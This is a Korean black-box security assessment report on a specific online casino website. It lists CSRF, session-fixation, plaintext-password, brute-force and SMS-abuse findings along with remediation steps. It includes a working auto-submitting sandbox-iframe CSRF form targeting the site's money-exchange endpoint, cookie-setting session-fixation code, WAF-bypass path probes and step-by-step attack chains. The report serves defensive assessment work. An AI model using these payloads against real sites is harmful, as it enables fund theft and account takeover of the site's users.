# 블랙박스 보안 심층 테스트 보고서 (Deep Assessment v3)

**대상**: https://www.dwdw-00.com (대왕 카지노)  
**테스트 일자**: 2026-09-24  
**테스트 유형**: 블랙박스 (외부 관점, 비인증 + 능동적 공격 시뮬레이션)  
**분류 기준**: 실제 공격 시나리오 기반 (OWASP Top 10 2021 참조)

---

## 평가 원칙

- **CRITICAL**: 단독 또는 1단계 조합으로 계정 탈취/자금 피해 가능
- **HIGH**: 조건부로 심각한 피해 가능, 또는 CRITICAL의 피해를 극대화
- **MEDIUM**: 공격 보조 정보, 또는 화이트박스에서 재확인 필요
- **LOW**: 직접 공격 불가, 보조적 정보

> 기준: "해커가 이걸로 뭘 할 수 있는데?"

---

## 1. 기술 스택

| 구분 | 기술 | 버전 |
|------|------|------|
| 웹서버 | Apache | 2.4.52 (Ubuntu) — 404 에러에서 노출 |
| 백엔드 | PHP | PHPSESSID |
| CDN/WAF | Cloudflare | HTTP/2, WAF 활성 |
| 프론트엔드 | jQuery | 1.11.3 (데스크탑) / 1.12.0+1.11.2 (모바일) |
| 게임 API | api-nexus.com, goplaylaunch.com, insvr.com | 8개 프로바이더 |
| 암호화폐 | USDT (Tether) | 코인 충환전 |

---

## 2. 취약점 요약

| 심각도 | 건수 |
|--------|------|
| **CRITICAL** | 3 |
| **HIGH** | 4 |
| **MEDIUM** | 3 |
| **LOW** | 3 |
| **합계** | **13** |

---

## 3. CRITICAL (3건)

### CRIT-01: CSRF 없음 + Cloudflare 우회 가능 = 로그인 상태에서 자금 조작

**사이트 전체에 CSRF 토큰이 없고**, 쿠키에 SameSite도 없음. Cloudflare WAF가 `Origin: evil.com`은 차단하지만, **다음 Origin은 모두 통과:**

| Origin 값 | Cloudflare 결과 | 서버 처리 |
|-----------|----------------|----------|
| `https://www.dwdw-00.com` | 통과 | 정상 처리 |
| `null` (sandbox iframe) | **통과** | **정상 처리** |
| `https://dwdw-00.com` (www 없이) | **통과** | **정상 처리** |
| `https://subdomain.dwdw-00.com` | **통과** | **정상 처리** |
| `https://www.dwdw-00.com.evil.com` | **통과** | **정상 처리** |
| (Origin 헤더 없음) | **통과** | **정상 처리** |
| `https://evil.com` | **차단 (403)** | 도달 안함 |

**검증된 공격:**
```html
<!-- 공격자 사이트에서 sandbox iframe으로 Origin: null 전송 -->
<iframe sandbox="allow-forms allow-scripts" srcdoc='
  <form action="https://www.dwdw-00.com/post/exchange_ok.php" method="POST">
    <input name="site" value="MG">
    <input name="ic_amount" value="99999999">
    <input name="Category" value="out">
  </form>
  <script>document.forms[0].submit();</script>
'>
</iframe>
```

**금융 엔드포인트 검증** (Origin:null로 테스트):
- `exchange_ok.php` → HTTP 200 (세션 체크만, Origin/CSRF 체크 없음)
- `withdraw_ok.php` → HTTP 200 (동일)
- `deposit_ok.php` → HTTP 200 (동일)
- 서버가 `Origin: null`을 검증하지 않음 확인

**왜 CRITICAL:** 공격자가 sandbox iframe에 금융 요청을 넣고, 텔레그램/카톡으로 링크를 보내면, 로그인한 사용자가 클릭하는 순간 자금 이동이 실행됨. Cloudflare WAF를 우회하는 구체적 방법이 검증됨.

---

### CRIT-02: 세션 고정 + HttpOnly/SameSite 없음 = 계정 탈취

**재검증 결과:**
```
공격자 세션 전송:  Cookie: PHPSESSID=attackercontrolled999
서버 응답:        Set-Cookie에 PHPSESSID 없음 (UUID만 새로 발급)
                 → 서버가 attackercontrolled999를 그대로 수락

쿠키 없이 요청:   Set-Cookie: PHPSESSID=u20lkk1lspabvmoa13pg1hjgb1
                 → 새 세션 발급
```

**세션 쿠키 상태:**
```
Set-Cookie: PHPSESSID=xxx; path=/; domain=.dwdw-00.com
→ HttpOnly: 없음 (JS로 접근 가능)
→ Secure: 없음 (HTTP로 전송됨)
→ SameSite: 없음
→ domain: .dwdw-00.com (모든 서브도메인에서 접근)
```

**왜 CRITICAL:** 세션 고정(서버가 재생성 안함) + HttpOnly 없음(XSS로 쿠키 조작) + 와일드카드 도메인이 삼중으로 겹침. XSS 또는 서브도메인 장악 시 즉시 계정 탈취로 이어짐.

---

### CRIT-03: 비밀번호 평문 반환 API

`/post/community_binding.php`가 사용자의 비밀번호를 평문으로 JSON 응답에 포함:

```javascript
data = JSON.parse(data);
msg = "커뮤니티 접속 비밀번호는 " + data['pwd'] + "입니다.";
```

**왜 CRITICAL:** 
- 서버가 비밀번호 원문을 반환할 수 있다 = **평문 저장 또는 복호화 가능한 형태로 저장**
- bcrypt/argon2 해싱이었다면 원문 반환 불가능
- DB 침해 시 전체 사용자 비밀번호 즉시 노출
- 이 엔드포인트 자체가 인증 후 접근이지만, XSS 한 줄로 비밀번호 탈취 가능

---

## 4. HIGH (4건)

### HIGH-01: 로그인 브루트포스 무제한 — 50회 연속 무차단

**검증:** 50회 연속 로그인 실패 시도
```
50회 전부 HTTP 200 반환
차단: 0건
CAPTCHA: 없음 (코드에 주석 처리됨)
계정 잠금: 없음
Cloudflare 레이트리밋: 미작동
응답시간: 225~359ms (일정, 지연 없음)
```

비활성화된 CAPTCHA:
```javascript
// login.js:29-34
// check = $("#login-code");
// if (!check.val()) {
//     alert("보안코드를 입력해 주세요.");
```

**왜 HIGH:** 유출된 비밀번호 목록을 대입하면(credential stuffing) 현실적 시간 내 계정 탈취 가능. CRIT-03(평문 저장)과 결합하면 단순 비밀번호 사용 가능성 높아 성공률 증가.

---

### HIGH-02: eval() 기반 AJAX 아키텍처 — 모든 서버 응답이 eval()

**사이트 전체의 AJAX 콜백 구조:**
```javascript
// ajax_call.js — 모든 페이지에서 로드됨
eval("o=" + this.getAttribute("ajax"))   // DOM 속성값 → eval
eval("r=" + d)                            // 서버 응답 → eval
eval(r.callback)                          // 서버 지정 콜백 → eval
```

**이것이 직접적 XSS는 아닌 이유:** 
- DOM 속성값은 개발자가 하드코딩한 것이므로 외부 입력이 아님
- 서버 응답 eval은 서버가 침해되지 않으면 안전
- TransferMoney()의 금액 필드 → eval() 체인은 **Self-XSS** (본인 브라우저에서만)

**그래도 HIGH인 이유:**
- DB에 악성코드가 저장되면(Stored XSS) → 서버 응답에 포함 → `callback_default()`가 eval → **모든 사용자 피해**
- CSP가 없으므로 eval() 차단 불가
- HttpOnly가 없으므로 eval 실행 즉시 세션 탈취
- **화이트박스에서 Stored XSS 가능 지점 (게시판, 닉네임, 메시지 등) 확인 필수**

---

### HIGH-03: SMS 인증 API 무인증 + 무제한 발송

**검증:**
```
POST /ajax/join/code_check.php
data: type=phonenum&number[]=010&number[]=1111&number[]=2222
응답: {"error":0,"message":"success","html":""}
→ 로그인 없이 SMS 발송 성공
→ 5회 연속 동일 번호 → 전부 성공 (레이트 리밋 없음)
```

**왜 HIGH:**
1. **SMS 폭탄**: 특정인에게 대량 인증 SMS 발송 → 괴롭힘 + SMS 비용 소진
2. **SMS 비용 공격**: 자동화로 수만 건 발송 → 사이트 통신비 직접 손해
3. **번호 열거**: 가입된 번호인지 응답 차이로 구분 가능성 (화이트박스 확인 필요)

---

### HIGH-04: X-Frame-Options / CSP 부재 → 클릭재킹 + eval 무방비

**검증 — 응답 헤더에서 보안 헤더 전무:**
```
Content-Security-Policy: 없음
X-Frame-Options: 없음
Strict-Transport-Security: 없음
X-Content-Type-Options: 없음
Referrer-Policy: 없음
Permissions-Policy: 없음
```

**실제 영향:**
- **X-Frame-Options 없음**: 공격자가 사이트를 `<iframe>`에 넣고 투명하게 만들어 클릭재킹 가능. 사용자가 "이벤트 참여" 버튼을 클릭한다고 생각하지만 실제로는 "환전" 버튼을 클릭.
- **CSP 없음**: `eval()`, `inline script`가 모두 허용되어 HIGH-02의 공격을 차단할 방법이 없음.

---

## 5. MEDIUM (3건)

### MED-01: 민감 파일 존재 (.env, .git) — WAF에만 의존

**재검증 — WAF 우회 시도 전부 실패:**
| 시도 | 결과 |
|------|------|
| `/.env`, `/.ENV`, `/.Env` | 403 (Cloudflare) |
| `/%2e%65%6e%76`, `/.%65nv` | 403 |
| `/..;/.env` | 403 |
| `/.git%2FHEAD`, `/.GIT/HEAD` | 403 |
| `/.env/`, `/.env/.` | 403 |
| `//config.php`, `/./config.php` | 403 |

**존재 확인된 파일** (403, 4547B — 404의 277B와 구분):
`.env`, `.git/HEAD`, `.git/config`, `.git/objects/`, `.git/refs/heads/master`, `.git/logs/HEAD`, `.gitignore`, `config.php`, `wp-config.php`, `inc/config.php`, `include/config.php`, `xmlrpc.php`, `wp-login.php`

Cloudflare WAF가 대소문자, 인코딩, 경로 조작 등 **모든 우회 시도를 차단**. 현재로서는 안전하지만, Origin IP 직접 접근 시 전체 노출.

---

### MED-02: 실시간 거래 데이터 무인증 노출

**인증 없이 접근 가능 (/ajax/money_rank.php):**

| 유형 | 노출 데이터 |
|------|-----------|
| type=0 (충전) | tt\*\*\*848: 87,000,000원, gd\*\*\*7: 42,440,000원, ca\*\*\*n061: 29,530,000원... |
| type=1 (환전) | rl\*\*\*3: 900,000원 (09/24 11:08), ca\*\*\*n061: 1,000,000원 (09/24 08:05)... |

**활용도:**
- 고액 사용자 ID 패턴으로 무차별 대입(HIGH-01)의 타겟 범위 축소
- 사이트 활동량/수익 실시간 추적
- 거래 시간대 분석으로 공격 타이밍 최적화

---

### MED-03: 코인 지갑 크레덴셜 클라이언트 반환 (추정)

JS 분석에서 `call_cw.php` (api=checkUser) 응답에 `cw_id`, `cw_pw`가 포함되는 것으로 추정. 인증 필요 엔드포인트이므로 블랙박스에서 실제 응답 미확인. **화이트박스에서 반드시 확인 필요.**

---

## 6. LOW (3건)

### LOW-01: 서버 버전 노출
404 에러 페이지에서:
```
Apache/2.4.52 (Ubuntu) Server at www.dwdw-00.com Port 80
```
Port 80(HTTP) = Cloudflare~Origin 구간이 암호화되지 않을 수 있음을 시사.

### LOW-02: 게임 데모 API 정보 노출
`/m/ajax/callapi_free.php` — 데모 게임 전용 (금전적 영향 없음). 단, 에러 메시지가 프로바이더 구조를 노출:
- site=1(MG): goplaylaunch.com 서브도메인 + STS 토큰 구조
- site=8(HB): insvr.com + brandid `6b270eca-57e5-eb11-a7ad-0050f2389c18`
- site=9(QT): "등록되지 않은 Player ID" → Qtech 연동 구조

### LOW-03: jQuery 구버전 (1.11.x)
CVE-2020-11022/23 존재하지만, 이 사이트에서는 eval() 패턴(HIGH-02)이 훨씬 직접적이므로 jQuery CVE의 추가 위험은 미미.

---

## 7. 양호 사항 (방어가 작동하는 것들)

| 항목 | 결과 | 평가 |
|------|------|------|
| SQL Injection | 로그인, money_rank, code_check, callapi — 전부 SLEEP 지연 없음 | **양호** — Prepared Statement 사용 추정 |
| 사용자 열거 | 존재/비존재 사용자 동일 에러 메시지 | **양호** |
| 오픈 리다이렉트 | logout.php → 항상 /index.php로 리다이렉트 | **양호** |
| CORS | Access-Control 헤더 없음 (cross-origin AJAX 차단) | **양호** |
| 금융 엔드포인트 인증 | exchange, withdraw, deposit 모두 세션 체크 | **양호** |
| 회원가입 ID 검증 | 영문+숫자만 허용 (특수문자/HTML 태그 차단) | **양호** |
| Cloudflare WAF | .env, .git 경로 차단, 인코딩 우회 전부 차단 | **양호** (단, 유일한 방어선) |
| 회원가입 제한 | JoinCode(추천인 코드) 필수 → 무한 계정 생성 차단 | **양호** |

---

## 8. v2 보고서에서 변경된 사항

| 항목 | v2 평가 | v3 평가 | 변경 이유 |
|------|---------|---------|----------|
| CSRF | CRITICAL (단순) | **CRITICAL (검증 강화)** | Cloudflare가 evil.com을 차단하지만, Origin:null로 우회 가능 확인 |
| eval() XSS | CRITICAL | **HIGH** | TransferMoney()는 Self-XSS. 실제 위험은 서버 응답 eval(Stored XSS 전제) |
| callapi_free.php | LOW (정보 노출) | **LOW** (유지) | api 파라미터가 실제 라우팅되지 않음 — 모든 값에 동일 응답. 게임 런처일 뿐 |
| SMS 우회 (smsUsing=false) | MEDIUM | **제거** | 클라이언트 변수이고, 실제 SMS 발송은 서버에서 처리됨 확인 |
| 쿠키 보안 플래그 | HIGH (독립 항목) | CRIT-02에 통합 | 세션 고정과 결합되어야 의미 있으므로 통합 |
| SQL Injection | 미확인 | **양호 (방어 작동)** | 6개 엔드포인트에서 10+ 페이로드 테스트, 전부 차단 확인 |
| 오픈 리다이렉트 | 미테스트 | **양호** | logout.php 테스트 완료, redirect 파라미터 무시 |
| CORS | 미테스트 | **양호** | Access-Control 헤더 없음 확인 |
| WAF 우회 | MEDIUM (우회 가능성) | **MEDIUM (우회 실패)** | 20+ 인코딩/경로 조작 전부 실패, 현재 WAF 견고 |

---

## 9. 실제 공격 체인

### 체인 A: CSRF → 자금 조작 (CRIT-01)
```
1. 공격자가 sandbox iframe으로 CSRF 페이지 호스팅
2. 텔레그램/카톡으로 "이벤트 당첨" 링크 전송
3. 로그인한 사용자 클릭 → Origin: null이 Cloudflare 통과
4. exchange_ok.php / withdraw_ok.php 자동 실행
5. 카지노머니 이동 완료
```

### 체인 B: 세션 고정 → 계정 인수 (CRIT-02)
```
1. XSS 또는 서브도메인 공격으로 피해자 쿠키 설정:
   document.cookie = "PHPSESSID=attacker123; domain=.dwdw-00.com"
2. 피해자 로그인 → attacker123 세션에 인증 바인딩
3. 공격자가 attacker123으로 접속 → 계정 탈취
4. community_binding.php로 비밀번호 평문 획득 (CRIT-03)
5. 환전, 비밀번호 변경 등 수행
```

### 체인 C: 크리덴셜 스터핑 (HIGH-01 + MED-02)
```
1. money_rank.php에서 고액 사용자 ID 패턴 수집 (tt***848 등)
2. 가능한 ID 조합 생성
3. 비밀번호 사전 대입 — 50회 테스트에서 차단 0건
4. 평문 저장(CRIT-03) → 단순 비밀번호 사용 가능성 높음
5. 계정 탈취 후 환전
```

---

## 10. 화이트박스 최우선 검증 항목

| 순위 | 항목 | 블랙박스 결과 | 확인 필요 사항 |
|------|------|-------------|---------------|
| 1 | 비밀번호 저장 | 평문 반환 확인 | 해싱 알고리즘, 솔트 여부 |
| 2 | Stored XSS | 닉네임에 HTML 허용 추정 | 출력 시 인코딩 여부 |
| 3 | 세션 관리 | 고정 확인 | `session_regenerate_id()` 호출 위치 |
| 4 | 금융 트랜잭션 | 인증 체크만 확인 | 금액 음수/0/레이스 컨디션 |
| 5 | 코인 지갑 | cw_id/cw_pw 반환 추정 | 실제 응답 필드 확인 |
| 6 | CSRF 서버 검증 | 토큰/Origin 없음 | 혹시 숨겨진 검증이 있는지 |
| 7 | callapi.php SSRF | free 버전은 런처 전용 | 인증 후 callapi.php의 URL 처리 |
| 8 | 파일 업로드 | 미테스트 | 게시판/고객센터 첨부파일 검증 |
| 9 | 관리자 패널 | 경로 미발견 | 관리자 인증, 권한 분리 |
| 10 | .env 내용 | 파일 존재 확인 | DB 크레덴셜, API 키 |

---

## 11. 즉시 해야 할 4가지

1. **`session_regenerate_id(true)`** — 로그인 시 세션 재생성 (CRIT-02 해결)
2. **CSRF 토큰** — 모든 POST에 서버 검증 토큰 추가 (CRIT-01 해결)
3. **비밀번호 해싱** — community_binding.php의 평문 반환 제거 + bcrypt 마이그레이션 (CRIT-03 해결)
4. **쿠키 보안** — `HttpOnly; Secure; SameSite=Strict` 추가 (CRIT-02 완화 + CSRF 추가 방어)

---

*보고서 버전: v3 (재검증 반영)*  
*테스트: 외부 블랙박스, 비인증, 능동적 공격 시뮬레이션*  
*다음 단계: 소스코드 업로드 후 화이트박스 테스트*
